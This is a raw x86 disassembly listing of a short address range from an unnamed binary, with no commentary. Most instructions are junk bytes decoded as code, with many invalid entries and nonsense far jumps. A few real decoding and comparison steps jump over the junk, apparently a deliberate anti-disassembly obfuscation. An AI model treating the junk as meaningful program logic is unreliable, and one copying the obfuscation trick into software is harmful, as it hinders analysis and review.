  407a64:	mov    ebp,0xd773fae7
  407a69:	aas    
  407a6a:	or     eax,0xee4f0573
  407a6f:	fucomp st(4)
  407a71:	retf   
  407a72:	aas    
  407a73:	jp     0x407abf
  407a75:	jmp    0x940fc3b8
  407a7a:	jns    0x407a31
  407a7c:	rcr    DWORD PTR [edi+0x3dac73fc],1
  407a82:	cli    
  407a83:	jnp    0x407a77
  407a85:	or     ch,bl
  407a87:	mov    dl,0x62
  407a89:	in     eax,0x29
  407a8b:	fs fwait
  407a8d:	cmp    esi,DWORD PTR [esi-0x1c]
  407a90:	mov    edx,0x4b8372a0
  407a95:	sbb    eax,0x286edf42
  407a9a:	es mov bl,0x54
  407a9d:	push   es
  407a9e:	rcl    DWORD PTR [esi],1
  407aa0:	scas   al,BYTE PTR es:[edi]
  407aa1:	push   esp
  407aa2:	(bad)  
  407aa3:	clc    
  407aa4:	and    DWORD PTR [ebp+0xc],esp
  407aa7:	sub    al,0xa5
  407aa9:	xchg   ecx,eax
  407aaa:	fistp  DWORD PTR [eax]
  407aac:	xchg   BYTE PTR ds:0x1113ec05,bh
  407ab2:	pop    ss
  407ab3:	cwde   
  407ab4:	fbld   TBYTE PTR [edx+0x1b3f5ce2]
  407aba:	xor    dh,BYTE PTR [eax]
  407abc:	inc    esp
  407abd:	hlt    
  407abe:	gs stc 
  407ac0:	add    dl,bh
  407ac2:	xor    bl,ch
  407ac4:	inc    eax
  407ac5:	xchg   ebx,eax
  407ac6:	adc    ebp,DWORD PTR [edi]
  407ac8:	push   cs
  407ac9:	fs aaa 
  407acb:	mov    ?,WORD PTR [eax]
  407acd:	jmp    0x1cd4:0x14231697
  407ad4:	mov    eax,ebp
  407ad6:	mov    al,0xa2
  407ad8:	sub    DWORD PTR [ebx-0x2c],ebp
  407adb:	jb     0x407b0a
  407add:	mov    al,0xe5
  407adf:	dec    ebp
  407ae0:	add    edx,ecx
  407ae2:	and    BYTE PTR [eax-0x6ed0b1b],bl
  407ae8:	xchg   BYTE PTR [ecx],bl
  407aea:	inc    esi
  407aeb:	or     edx,DWORD PTR [edi-0x3fad2fd6]
  407af1:	dec    ebp
  407af2:	push   es
  407af3:	add    ch,bl
  407af5:	pusha  
  407af6:	and    DWORD PTR [eax-0x7c],edx
  407af9:	jnp    0x407af8
  407afb:	push   edi
  407afc:	jg     0x407b41
  407afe:	ret    0x3194
  407b01:	adc    al,dh
  407b03:	loop   0x407abc
  407b05:	and    BYTE PTR [ebp+ebp*4+0x71f447c],0xa2
  407b0d:	shl    DWORD PTR [esi+ebx*8],0xb5
  407b11:	sub    ecx,esi
  407b13:	cmp    dl,bl
  407b15:	xchg   esi,eax
  407b16:	dec    ebx
  407b17:	mov    eax,DWORD PTR [ebp+0x8]
  407b1a:	movzx  eax,WORD PTR [eax+edx*4]
  407b1e:	xor    eax,0x8a40
  407b23:	add    eax,edi
  407b25:	mov    edi,DWORD PTR [ebp-0x14]
  407b28:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407b2c:	mov    eax,DWORD PTR [ebp-0xc]
  407b2f:	inc    edx
  407b30:	cmp    edx,eax
  407b32:	jne    0x407679
  407b38:	pop    edi
  407b39:	pop    ebx
  407b3a:	jmp    0x407cbb
  407b3f:	fistp  QWORD PTR [edi]
  407b41:	aas    
  407b42:	or     bl,bh
  407b44:	or     ch,bl
  407b46:	jmp    0x407b0d
  407b48:	jle    0x407b96
  407b4a:	dec    ebx
  407b4b:	hlt    
  407b4c:	adc    al,cl
  407b4e:	xchg   esp,eax
  407b4f:	jge    0x407b16
  407b51:	jle    0x407bd1
  407b53:	sar    BYTE PTR [edi+0x7e],cl
  407b56:	jle    0x407bc2
  407b58:	jmp    0x2d24:0xbb7480e2
  407b5f:	cld    
  407b60:	xchg   ebp,eax
  407b61:	cmc    
  407b62:	fnsave [edx-0x6c]
  407b65:	nop
  407b66:	sbb    al,0x96
  407b68:	je     0x407b45
  407b6a:	fistp  WORD PTR [esi+0x7a]
  407b6d:	or     BYTE PTR [ecx+0x2b],ah
  407b70:	fistp  WORD PTR [eax*8+0x5905b535]
  407b77:	nop
  407b78:	adc    BYTE PTR [ebx+0x3c],0x58
  407b7c:	xlat   BYTE PTR ds:[ebx]
  407b7d:	test   al,0xc2
  407b7f:	xor    dh,BYTE PTR [esi-0x2e625f58]
  407b85:	stos   BYTE PTR es:[edi],al
  407b86:	sbb    BYTE PTR [eax+ecx*4-0x1fc65b25],bh
  407b8d:	jne    0x407b49
  407b8f:	push   ss
  407b90:	hlt    
  407b91:	(bad)  
  407b92:	cmp    eax,0x58086092
  407b97:	pop    edx
  407b98:	push   ss
  407b99:	sub    DWORD PTR [esi-0xb],eax
  407b9c:	inc    edi
  407b9d:	mov    ebp,ebx
  407b9f:	jmp    0x7138385b
  407ba4:	frstor [edx]
  407ba6:	jge    0x407be8
  407ba8:	mov    bh,0xb1
  407baa:	int    0xb3
  407bac:	add    DWORD PTR [eax-0x653bc09e],ecx
  407bb2:	push   0x5e
  407bb4:	lea    ebx,[ebp-0x55d813c]
  407bba:	push   es
  407bbb:	sub    BYTE PTR [edx+0x14],bh
  407bbe:	into   
  407bbf:	test   BYTE PTR [ebx],cl
  407bc1:	jnp    0x407b5c
  407bc3:	xor    dl,cl
  407bc5:	popa   
  407bc6:	adc    BYTE PTR [eax+0x1b],0x9
  407bca:	in     al,0xf1
  407bcc:	sbb    al,0x3b
  407bce:	mov    edx,0x1dea5f12
  407bd3:	push   cs
  407bd4:	jns    0x407bdf
  407bd6:	pop    ebp
  407bd7:	lds    eax,FWORD PTR [edx+0x72]
  407bda:	adc    esi,edi
  407bdc:	mov    al,BYTE PTR [eax+0x667879bf]
  407be2:	cmp    al,0xd8
  407be4:	pop    ecx
  407be5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407be6:	xchg   ecx,eax
  407be7:	push   eax
  407be8:	outs   dx,BYTE PTR ds:[esi]
  407be9:	add    al,0xfc
  407beb:	jp     0x407bc6
  407bed:	les    edi,FWORD PTR [ecx+edx*4]
  407bf0:	mov    al,0x60
  407bf2:	fdiv   QWORD PTR ss:[eax-0x74fce161]
  407bf9:	nop
  407bfa:	adc    al,0x3d
  407bfc:	dec    eax
  407bfd:	mov    ebx,0x526ed788
  407c02:	in     al,0x6a
  407c04:	push   ss
  407c05:	div    BYTE PTR [edi+ebx*2-0x67609284]
  407c0c:	test   BYTE PTR [ebx+0x79],dl
  407c0f:	(bad)  
  407c10:	pop    ss
  407c11:	push   eax
  407c12:	clc    
  407c13:	in     eax,dx
  407c14:	out    dx,eax
  407c15:	cmc    
  407c16:	jge    0x407c5d
  407c18:	and    ebp,DWORD PTR ds:0x5febb00a
  407c1e:	(bad)  
  407c20:	fidiv  WORD PTR [edi+0x1298ca82]
  407c26:	xchg   ah,dl
  407c28:	clc    
  407c29:	loopne 0x407c0a
  407c2b:	popa   
  407c2c:	sbb    DWORD PTR [esi],esi
  407c2e:	call   0x5382:0x795a5f04
  407c35:	jae    0x407bde
  407c37:	(bad)  
  407c38:	push   ebx
  407c39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c3a:	outs   dx,BYTE PTR ds:[esi]
  407c3b:	xchg   edx,eax
  407c3c:	leave  
  407c3d:	(bad)  
  407c3e:	ds cli 
  407c40:	pop    esp
  407c41:	add    ebx,ecx
  407c43:	sbb    al,0x66
  407c45:	dec    edi
  407c46:	add    edx,0xfbe70262
  407c4c:	fist   WORD PTR [ebx+ecx*4+0x44]
  407c50:	ret    0x2552
  407c53:	jg     0x407cc4
  407c55:	cld    
  407c56:	(bad)  
  407c57:	and    esp,DWORD PTR [edi-0x76396468]
  407c5d:	jno    0x407c9d
  407c5f:	add    al,BYTE PTR [esi-0x15]
  407c62:	push   esi
  407c63:	pop    esp
  407c64:	adc    al,0x42
  407c66:	and    bh,bh
  407c68:	adc    ecx,DWORD PTR [edx+edx*1-0x2644dd89]
  407c6f:	pop    eax
  407c70:	in     eax,dx
  407c71:	dec    eax
  407c72:	lods   eax,DWORD PTR ds:[esi]
  407c73:	jecxz  0x407c63
  407c75:	retf   
  407c76:	fldenv [ecx-0x56a0565c]
  407c7c:	mov    edi,edx
  407c7e:	or     esi,DWORD PTR [edx+0x248ae9ad]
  407c84:	dec    eax
  407c85:	mov    al,BYTE PTR [edx]
  407c87:	test   eax,0x20f49d5
  407c8c:	repz sbb eax,0x987f84e7
  407c92:	or     DWORD PTR [ecx],0x6bde990d
  407c98:	jle    0x407c1e
  407c9a:	bound  edx,QWORD PTR [ecx]
  407c9c:	into   
  407c9d:	retf   
  407c9e:	xchg   edx,eax
  407c9f:	test   cl,dh
  407ca1:	xchg   esp,eax
  407ca2:	and    BYTE PTR [ebp+0x56],bl
  407ca5:	inc    edx
  407ca6:	inc    esp
  407ca7:	and    al,0x3
  407ca9:	inc    esi
  407caa:	fwait
  407cab:	in     eax,dx
  407cac:	fs jmp 0x51b3:0x7ce8a3dc
  407cb4:	mov    bl,0x2c
  407cb6:	cmc    
  407cb7:	or     BYTE PTR [edi-0x5d],ah
  407cba:	(bad)  
  407cbb:	mov    eax,DWORD PTR [ebp-0x8]
  407cbe:	mov    edx,DWORD PTR [ebp+0x10]
  407cc1:	xor    eax,ecx
  407cc3:	add    eax,esi
  407cc5:	mov    DWORD PTR [edx],eax
  407cc7:	mov    eax,DWORD PTR [ebp-0x8]
  407cca:	xor    eax,ecx
  407ccc:	add    eax,esi
  407cce:	jmp    0x407e4f
  407cd3:	mov    bh,0xb6
  407cd5:	(bad)  
  407cd6:	ror    DWORD PTR [edi+0x86a7bfb],cl
  407cdc:	dec    ebx
  407cdd:	ror    DWORD PTR [edx],cl
  407cdf:	xor    al,0x7a
  407ce1:	xor    BYTE PTR [eax+0x7e7ec7d1],dh
  407ce7:	sar    BYTE PTR [edi+0x7e],cl
  407cea:	jle    0x407cf3
  407cec:	mov    bl,0xa6
  407cee:	mov    al,0xf6
  407cf0:	stos   DWORD PTR es:[edi],eax
  407cf1:	push   edx
  407cf2:	mov    ebp,0xd7fd188e
  407cf7:	sub    cl,bh
  407cf9:	mov    ebx,0xdffa3799
  407cfe:	sub    dl,BYTE PTR ds:0x2677f7e9
  407d04:	mov    ah,0xf6
  407d06:	dec    ecx
  407d07:	jne    0x407c98
  407d09:	in     al,0x6b
  407d0b:	dec    ebx
  407d0c:	pop    edx
  407d0e:	mov    dl,0x7c
  407d10:	cmc    
  407d11:	cmp    al,0x2e
  407d13:	mov    eax,0x3b11d306
  407d18:	cmp    al,0x71
  407d1a:	sbb    dh,BYTE PTR [ebx-0x43]
  407d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d1e:	mov    BYTE PTR [edi],dl
  407d20:	or     BYTE PTR [edx],ch
  407d22:	or     al,0x9a
  407d24:	popa   
  407d25:	scas   eax,DWORD PTR es:[edi]
  407d26:	dec    edi
  407d27:	int3   
  407d28:	sar    DWORD PTR [eax-0x7c2234c],1
  407d2e:	mov    ebp,esi
  407d30:	(bad)  
  407d32:	rcl    DWORD PTR [eax+0x56ae3c4f],0xac
  407d39:	xor    ecx,DWORD PTR [ecx+0x5e]
  407d3c:	popf   
  407d3d:	pop    ss
  407d3e:	inc    cx
  407d40:	push   0x8a77ba23
  407d45:	add    BYTE PTR [edi+0xc],dl
  407d48:	mov    cl,0x93
  407d4a:	je     0x407ce0
  407d4c:	add    eax,0x86329a8c
  407d51:	sub    ch,bl
  407d53:	hlt    
  407d54:	or     al,0x11
  407d56:	(bad)  
  407d57:	in     eax,0x56
  407d59:	or     eax,0x4f55e5de
  407d5e:	outs   dx,BYTE PTR ds:[esi]
  407d5f:	pop    ss
  407d60:	fwait
  407d61:	push   0x76
  407d63:	popf   
  407d64:	lods   eax,DWORD PTR ds:[esi]
  407d65:	pop    DWORD PTR [edx]
  407d67:	push   ecx
  407d68:	xor    al,0x47
  407d6a:	fidivr DWORD PTR [edx+0x3a]
  407d6d:	int3   
  407d6e:	adc    DWORD PTR [ebx],0xdeb2983c
  407d74:	stos   BYTE PTR es:[edi],al
  407d75:	jp     0x407dd6
  407d77:	sbb    BYTE PTR [eax-0x49],al
  407d7a:	cmp    BYTE PTR [edx+0x3b43a8ba],0x9e
  407d81:	mov    ebp,DWORD PTR [edx+0x191ce8b2]
  407d87:	jl     0x407de8
  407d89:	in     al,dx
  407d8a:	jne    0x407d83
  407d8c:	pushf  
  407d8d:	(bad)  
  407d8e:	ffreep st(2)
  407d90:	or     dh,BYTE PTR [edx+0x5215c98c]
  407d96:	or     al,0x5d
  407d98:	in     al,0xd1
  407d9a:	leave  
  407d9b:	jb     0x407dde
  407d9d:	mov    al,ds:0xbe0e66d7
  407da2:	push   edi
  407da3:	ins    DWORD PTR es:[edi],dx
  407da4:	test   DWORD PTR [edi+ebx*1-0x61],ecx
  407da8:	jo     0x407e10
  407daa:	adc    DWORD PTR [esi+0x7c],edx
  407dad:	xchg   edi,eax
  407dae:	jmp    0x407e10
  407db0:	fisttp DWORD PTR ds:0xe57943c
  407db6:	mov    dh,ah
  407db8:	mov    al,ds:0xb122e16e
  407dbd:	out    0x89,al
  407dbf:	jg     0x407d43
  407dc1:	push   0xffffff8f
  407dc3:	retf   0x7ed1
  407dc6:	dec    esp
  407dc7:	sti    
  407dc8:	pop    edx
  407dc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dca:	retf   
  407dcb:	outs   dx,DWORD PTR ds:[esi]
  407dcc:	pop    edi
  407dcd:	and    BYTE PTR [ebp+ebx*1+0x77a433b7],dl
  407dd4:	dec    edi
  407dd5:	(bad)  
  407dd6:	test   eax,0xd061b172
  407ddb:	in     eax,0x62
  407ddd:	sub    al,0x88
  407ddf:	add    ecx,DWORD PTR [edi]
  407de1:	(bad)  
  407de2:	fidivr WORD PTR [esi-0x6f]
  407de5:	mov    cl,0xfd
  407de7:	int3   
  407de8:	repnz (bad) 
  407dea:	push   0xffffff82
  407dec:	xor    DWORD PTR [eax+0x61aac1e7],ebx
  407df2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407df3:	stos   DWORD PTR es:[edi],eax
  407df4:	mov    al,0x11
  407df6:	jo     0x407dc1
  407df8:	push   ecx
  407df9:	das    
  407dfa:	add    edi,esp
  407dfc:	mov    edi,0xde489df7
  407e01:	sbb    eax,0xa679a809
  407e06:	call   0xf83a3f7c
  407e0b:	sbb    BYTE PTR [edi],bh
  407e0d:	or     eax,0x52b18631
  407e12:	pop    edi
  407e13:	lock push ecx
  407e15:	cmp    BYTE PTR [edi+0x3d05fafa],0x6b
  407e1c:	std    
  407e1d:	jae    0x407e95
  407e1f:	sbb    eax,0xdf80407b
  407e24:	lahf   
  407e25:	mov    ds:0xcc74a668,eax
  407e2a:	repz (bad) 
  407e2c:	out    dx,eax
  407e2d:	call   0xf0515ee0
  407e32:	daa    
  407e33:	js     0x407e9f
  407e35:	stos   DWORD PTR es:[edi],eax
  407e36:	inc    eax
  407e37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e38:	mov    al,ds:0x6c0b978c
  407e3d:	adc    BYTE PTR [ecx],ch
  407e3f:	addr16 inc ebp
  407e41:	sbb    al,0x7a
  407e43:	mov    DWORD PTR [eax],ebp
  407e45:	adc    esp,DWORD PTR [esi+0x5736d0ba]
  407e4b:	xchg   ebx,eax
  407e4c:	fldcw  WORD PTR [esi]
  407e4e:	int3   
  407e4f:	mov    DWORD PTR [ebp+0x8],eax
  407e52:	mov    eax,DWORD PTR [ebp+0x8]
  407e55:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e59:	mov    dl,BYTE PTR [ebp-0x1]
  407e5c:	cmp    al,dl
  407e5e:	je     0x4081a3
  407e64:	mov    eax,DWORD PTR [ebp+0x8]
  407e67:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e6b:	mov    edx,DWORD PTR [ebp+0xc]
  407e6e:	cmp    al,BYTE PTR [edx]
  407e70:	jne    0x40834a
  407e76:	mov    eax,DWORD PTR [ebp-0x8]
  407e79:	mov    edx,DWORD PTR [ebp+0xc]
  407e7c:	movsx  edx,BYTE PTR [edx]
  407e7f:	xor    eax,ecx
  407e81:	add    eax,esi
  407e83:	cmp    edx,eax
  407e85:	je     0x40833e
  407e8b:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  407e92:	lea    eax,[ebp-0x18]
  407e95:	jmp    0x408016
  407e9a:	xchg   BYTE PTR [eax],cl
  407e9c:	mov    al,ds:0xb8a6a08e
  407ea1:	or     BYTE PTR [edx],ah
  407ea3:	mov    bl,cl
  407ea5:	mov    dl,0xac
  407ea7:	dec    ebx
  407ea8:	fsubr  st,st(5)
  407eaa:	mov    ch,0xd8
  407eac:	jle    0x407f2c
  407eae:	sar    BYTE PTR [edi+0x7e],cl
  407eb1:	jle    0x407e33
  407eb3:	sbb    ebx,DWORD PTR [ebp-0x45b90304]
  407eb9:	inc    ebp
  407eba:	clc    
  407ebb:	pop    edx
  407ebc:	mov    cl,0xa9
  407ebe:	mov    esp,0x77df503d
  407ec3:	or     ch,BYTE PTR ss:[edx-0x1698e641]
  407eca:	pop    ebx
  407ecb:	and    eax,0x107af4c9
  407ed0:	sar    DWORD PTR [ecx],1
  407ed2:	std    
  407ed3:	jecxz  0x407f0f
  407ed5:	scas   al,BYTE PTR es:[edi]
  407ed6:	ret    
  407ed7:	imul   ebx,DWORD PTR [ebx],0xfffffff4
  407eda:	retf   0x9478
  407edd:	push   0xffffffc9
  407edf:	addr16 and al,0x1d
  407ee2:	inc    ebp
  407ee3:	in     eax,0x1a
  407ee5:	inc    ebx
  407ee6:	mov    ds:0xad76c7a0,eax
  407eeb:	and    eax,0xbe95152c
  407ef0:	adc    edx,DWORD PTR [ebx+0x5e]
  407ef3:	xor    BYTE PTR [ebp+ebx*4-0x2f829d94],al
  407efa:	pop    edx
  407efb:	mov    cs,WORD PTR [ecx+esi*8-0x7d02e7c0]
  407f02:	pop    es
  407f03:	push   ss
  407f04:	mov    bl,0x5d
  407f06:	fstp   QWORD PTR [eax-0x437f6f80]
  407f0c:	adc    edi,eax
  407f0e:	adc    ecx,eax
  407f10:	retf   0x430e
  407f13:	imul   esp
  407f15:	xchg   ebx,eax
  407f16:	test   BYTE PTR [ecx-0x29b74d66],ah
  407f1c:	call   0x8e29f48
  407f21:	ins    DWORD PTR es:[edi],dx
  407f22:	pusha  
  407f23:	jge    0x407f2f
  407f25:	pop    edi
  407f26:	add    bh,BYTE PTR [eax*4-0x292da8ab]
  407f2d:	dec    ebp
  407f2e:	jmp    0x407eb9
  407f30:	imul   ebp,DWORD PTR [eax],0xffffffb7
  407f33:	mov    BYTE PTR [ecx],bh
  407f35:	and    eax,0x76166955
  407f3a:	lods   eax,DWORD PTR ds:[esi]
  407f3b:	in     al,dx
  407f3c:	xchg   BYTE PTR [ebx-0x40fa9994],ch
  407f42:	lea    eax,[ecx+0x2d]
  407f45:	pop    ebp
  407f46:	fnstsw WORD PTR [ecx-0x66]
  407f49:	or     bl,BYTE PTR [edx+0x48]
  407f4c:	arpl   WORD PTR ds:0x2d2619f5,di
  407f52:	and    al,BYTE PTR [esi-0x1ba1f762]
  407f58:	xchg   esp,eax
  407f59:	and    eax,0xddf2fccf
  407f5e:	ins    BYTE PTR es:[edi],dx
  407f5f:	adc    al,0xec
  407f61:	sub    BYTE PTR [ebp-0x6793870d],al
  407f67:	cmp    al,0xd8
  407f69:	call   0x4b7a:0x3b5e6f1
  407f70:	xor    DWORD PTR [edi+0x68534fb4],ebx
  407f76:	jmp    0x60fbc444
  407f7b:	xor    bl,BYTE PTR [edi]
  407f7d:	retf   
  407f7e:	lea    ebp,[edx+0x4b]
  407f81:	dec    esp
  407f82:	(bad)  
  407f84:	fld    QWORD PTR [eax]
  407f86:	adc    si,si
  407f89:	dec    ecx
  407f8a:	test   al,0x91
  407f8c:	pop    es
  407f8d:	fcmovu st,st(3)
  407f8f:	popa   
  407f90:	adc    al,0x3b
  407f92:	add    edx,esp
  407f94:	fld    DWORD PTR [edi+0x1a77d06a]
  407f9a:	ss mov esp,0x573dfd18
  407fa0:	cdq    
  407fa1:	dec    edx
  407fa2:	mov    dl,0xb5
  407fa4:	outs   dx,DWORD PTR ds:[esi]
  407fa5:	rcr    DWORD PTR [eax-0x4e378627],0x5c
  407fac:	clc    
  407fad:	mov    WORD PTR [edx],ds
  407faf:	pop    edx
  407fb0:	ret    
  407fb1:	add    edi,DWORD PTR [ebx]
  407fb3:	inc    ebp
  407fb4:	sub    eax,0x9942d9f3
  407fb9:	mov    DWORD PTR [edx+ebp*4-0x64],edx
  407fbd:	bound  edx,QWORD PTR [ebp-0x10]
  407fc0:	xor    edi,DWORD PTR [edx+ebp*8-0x5d]
  407fc4:	clc    
  407fc5:	shl    DWORD PTR [ecx-0x79],1
  407fc8:	ins    BYTE PTR es:[edi],dx
  407fc9:	mov    esp,0x97482bed
  407fce:	(bad)  
  407fcf:	xor    eax,0xe23c8f5
  407fd4:	push   0x7ce26730
  407fd9:	jmp    0x407f7d
  407fdb:	fcomp  QWORD PTR [edx-0x5e7feb72]
  407fe1:	pop    ebp
  407fe2:	pop    ebp
  407fe3:	lea    esp,[edi-0x5a]
  407fe6:	sbb    DWORD PTR [edi-0x3b4e2d64],ebx
  407fec:	jns    0x407fa4
  407fee:	pop    es
  407fef:	neg    DWORD PTR [ebx+esi*2-0x4f785da]
  407ff6:	out    0xf7,eax
  407ff8:	in     eax,dx
  407ff9:	inc    edx
  407ffa:	stos   BYTE PTR es:[edi],al
  407ffb:	inc    esi
  407ffc:	cmp    bh,BYTE PTR ds:0x85222ebe
  408002:	jl     0x407ffb
  408004:	lock or eax,0x7b4d1499
  40800a:	mov    bl,0xac
  40800c:	xchg   ebp,eax
  40800d:	pop    esi
  40800e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40800f:	mov    edi,ebp
  408011:	cmp    eax,0xbc37c904
  408016:	mov    DWORD PTR [ebp-0x14],eax
  408019:	mov    eax,DWORD PTR [ebp-0x14]
  40801c:	add    DWORD PTR [eax],0x705fa8f
  408022:	jmp    0x4081a3
  408027:	test   al,0x70
  408029:	cmp    ch,BYTE PTR [ecx-0x46]
  40802c:	jge    0x4080ab
  40802e:	xor    DWORD PTR [edx-0x4f],eax
  408031:	imul   esi,DWORD PTR [edx-0x6f7fbdc0],0x7e7eda29
  40803b:	sar    BYTE PTR [edi+0x7e],cl
  40803e:	jle    0x4080a6
  408040:	in     eax,dx
  408041:	mov    ch,0x23
  408043:	or     al,0x52
  408045:	inc    ebx
  408046:	and    dl,BYTE PTR [edi-0x66850d73]
  40804c:	push   0xffffffce
  40804e:	scas   al,BYTE PTR es:[edi]
  40804f:	inc    ebx
  408050:	cmp    DWORD PTR [eax],0xffffffca
  408053:	pop    edi
  408054:	mov    edx,0x8143d8f4
  408059:	push   edi
  40805a:	cmp    eax,0x91af54f
  40805f:	stos   BYTE PTR es:[edi],al
  408060:	dec    eax
  408061:	mov    dh,0x2f
  408063:	add    dl,cl
  408065:	jbe    0x408011
  408067:	popa   
  408068:	loopne 0x4080b2
  40806a:	sub    al,BYTE PTR [ecx+0x1f]
  40806d:	popf   
  40806e:	adc    bh,0xea
  408071:	push   edi
  408072:	cmp    ecx,DWORD PTR [ebp+ecx*2+0x4e7bdbe7]
  408079:	cmp    BYTE PTR [ecx+0x11],ch
  40807c:	or     eax,0xc4b5136c
  408081:	aad    0x7d
  408083:	mov    dh,0x78
  408085:	xlat   BYTE PTR ds:[ebx]
  408086:	not    dl
  408088:	fwait
  408089:	das    
  40808a:	je     0x408026
  40808c:	and    BYTE PTR [eax+0x4f],dh
  40808f:	inc    edi
  408090:	ins    DWORD PTR es:[edi],dx
  408091:	sbb    esi,DWORD PTR [esi+0x72]
  408094:	pushf  
  408095:	push   esp
  408096:	mov    ds:0x20f5c590,al
  40809b:	cmp    bl,BYTE PTR [ebx]
  40809d:	iret   
  40809e:	cmp    BYTE PTR [esi+0x72477b67],dl
  4080a4:	sbb    bl,dl
  4080a6:	enter  0xbf87,0x90
  4080aa:	ror    DWORD PTR [ebx],0xec
  4080ad:	and    eax,0xad763151
  4080b2:	and    BYTE PTR [esp+ebp*4],bl
  4080b5:	cmp    dh,BYTE PTR [edi]
  4080b7:	jmp    0x87ab:0xb206aeee
  4080be:	imul   edx,DWORD PTR ds:0xe5ae06ef,0x24
  4080c5:	retf   
  4080c6:	std    
  4080c7:	mov    edi,0xfd8d669e
  4080cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080cd:	xchg   edi,eax
  4080ce:	pop    ebp
  4080cf:	loop   0x40813b
  4080d1:	xchg   esp,eax
  4080d2:	fsubrp st(2),st
  4080d4:	xchg   ebp,eax
  4080d5:	sub    DWORD PTR [esi+0x6f],esi
  4080d8:	fcomp  QWORD PTR [ebx-0x26996892]
  4080de:	jns    0x40813b
  4080e0:	sbb    al,0x65
  4080e2:	mov    DWORD PTR [ebx+0x27],eax
  4080e5:	inc    cx
  4080e7:	xor    ebx,eax
  4080e9:	imul   edi,DWORD PTR [ebx-0x55ca5a85],0x60
  4080f0:	leave  
  4080f1:	pop    esi
  4080f2:	pop    ss
  4080f3:	repnz xor BYTE PTR [ecx-0x6e],dl
  4080f7:	das    
  4080f8:	pop    eax
  4080f9:	pop    edx
  4080fa:	call   0x48b6:0x7ae81b66
  408101:	int3   
  408102:	into   
  408103:	or     eax,0x8b013d2a
  408108:	cdq    
  408109:	ret    0x9e4
  40810c:	adc    eax,0x16bcdb57
  408111:	cli    
  408112:	(bad)  
  408113:	lods   eax,DWORD PTR ds:[esi]
  408114:	call   0x3f93:0xc77bc6e6
  40811b:	jno    0x4080ab
  40811d:	mov    cl,BYTE PTR [ecx]
  40811f:	mov    eax,0x8bb98ac2
  408124:	xchg   DWORD PTR [ecx+0x8],ebx
  408127:	dec    esp
  408128:	pop    esi
  408129:	ret    
  40812a:	aam    0x29
  40812c:	cwde   
  40812d:	jmp    0x6d24ebfc
  408132:	fmul   DWORD PTR [ebp+0x3a]
  408135:	and    al,0xb4
  408137:	or     edx,DWORD PTR [edi]
  408139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40813a:	sbb    cl,0x93
  40813d:	cmp    cl,ch
  40813f:	mov    edx,0xeceec320
  408144:	js     0x40818a
  408146:	inc    edx
  408147:	aas    
  408148:	js     0x408122
  40814a:	fwait
  40814b:	loopne 0x408182
  40814d:	imul   ebx,DWORD PTR [ecx],0x501db3b
  408153:	loop   0x408161
  408155:	idiv   BYTE PTR [eax+ebp*4]
  408158:	mov    ebp,?
  40815a:	mov    bh,0xd8
  40815c:	mov    edi,0x7de8e67
  408161:	fst    QWORD PTR [ebp-0x2bff5eba]
  408167:	push   ebp
  408168:	xchg   ebp,eax
  408169:	inc    esp
  40816a:	add    eax,ecx
  40816c:	push   0xfffffff5
  40816e:	adc    ebx,DWORD PTR cs:[edi]
  408171:	or     BYTE PTR [edi+0xac08fd4],0x74
  408178:	retf   
  408179:	pushf  
  40817a:	jecxz  0x408161
  40817c:	cmp    eax,DWORD PTR [ebx-0x563eedbf]
  408182:	sbb    eax,0x38134d39
  408187:	enter  0x7db5,0x6b
  40818b:	loope  0x4081c8
  40818d:	rol    DWORD PTR [edi-0x24],0xe0
  408191:	out    dx,al
  408192:	test   BYTE PTR [esi+0x60],ch
  408195:	sub    dl,ch
  408197:	scas   al,BYTE PTR es:[edi]
  408198:	leave  
  408199:	mov    bh,0xe5
  40819b:	mov    edx,0x682cf5b6
  4081a0:	out    dx,al
  4081a1:	push   ebp
  4081a2:	sbb    al,0x8b
  4081a4:	inc    ebp
  4081a5:	lock mov edx,DWORD PTR [ebp+0x8]
  4081a9:	xor    eax,ecx
  4081ab:	jmp    0x40832c
  4081b0:	dec    edx
  4081b1:	sbb    ch,0x7
  4081b4:	fstp   QWORD PTR [ebx+0x4c]
  4081b7:	inc    ebp
  4081b8:	inc    eax
  4081b9:	jmp    DWORD PTR [ebp+0x1b8af98f]
  4081bf:	test   BYTE PTR [ebp-0x2d818125],0x7f
  4081c6:	jle    0x408246
  4081c8:	mov    ebx,0xb79de96d
  4081cd:	out    dx,al
  4081ce:	push   eax
  4081cf:	cwde   
  4081d0:	nop
  4081d1:	mov    ebx,0x2347b366
  4081d6:	dec    ebx
  4081d7:	and    eax,0x522b2250
  4081dc:	lahf   
  4081dd:	inc    esp
  4081de:	loope  0x408174
  4081e0:	or     esp,DWORD PTR [eax+0x217f6887]
  4081e6:	sbb    ebx,DWORD PTR ds:0x1d4e7ad2
  4081ec:	xchg   ebx,eax
  4081ed:	sub    BYTE PTR [ebp-0x2d713764],dh
  4081f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081f4:	add    BYTE PTR fs:0xb8501a26,bl
  4081fb:	jo     0x4081f2
  4081fd:	pop    es
  4081fe:	pushf  
  4081ff:	lds    ebp,FWORD PTR [edx+0x15f0e887]
  408205:	dec    edi
  408206:	jle    0x408256
  408208:	xor    BYTE PTR [esi],cl
  40820a:	jle    0x4081e3
  40820c:	mov    ds:0x8fac0dd4,eax
  408211:	(bad)  
  408212:	(bad)  [edx+ebx*1+0x3]
  408216:	add    DWORD PTR [eax],edx
  408218:	loop   0x40822c
  40821a:	addr16 loopne 0x408294
  40821d:	add    ecx,DWORD PTR [ebx-0x690e2404]
  408223:	mov    edx,0xbb108cc0
  408228:	lods   al,BYTE PTR ds:[esi]
  408229:	xchg   DWORD PTR [eax-0x5c],edx
  40822c:	push   edi
  40822d:	ins    DWORD PTR es:[edi],dx
  40822e:	stos   DWORD PTR es:[edi],eax
  40822f:	bound  eax,QWORD PTR [ecx]
